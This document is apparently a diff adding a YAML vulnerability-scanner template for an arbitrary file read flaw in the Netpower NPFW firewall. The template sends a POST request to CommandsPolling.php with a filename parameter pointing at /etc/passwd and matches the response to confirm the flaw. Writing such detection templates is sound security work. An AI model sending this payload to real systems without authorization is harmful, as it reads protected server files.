@@ -1,0 +1,28 @@
+id: netpower-npfw-lfi
+brief:
+    title: Netpower NPFW - Local File Inclusion
+    by: ritikchaddha
+    level: high
+    about: Netpower NPFW firewall has an arbitrary file read vulnerability. Due to insufficient code filtering, it can read any file on the server
+    label:
+        - netpower
+        - npfw
+        - lfi
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/direct/polling/CommandsPolling.php'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: command=ping&filename=%2Fetc%2Fpasswd&cmdParam=
+      signs:
+        - "on": word
+          has:
+            - '{"type":"event"'
+            - dealing
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
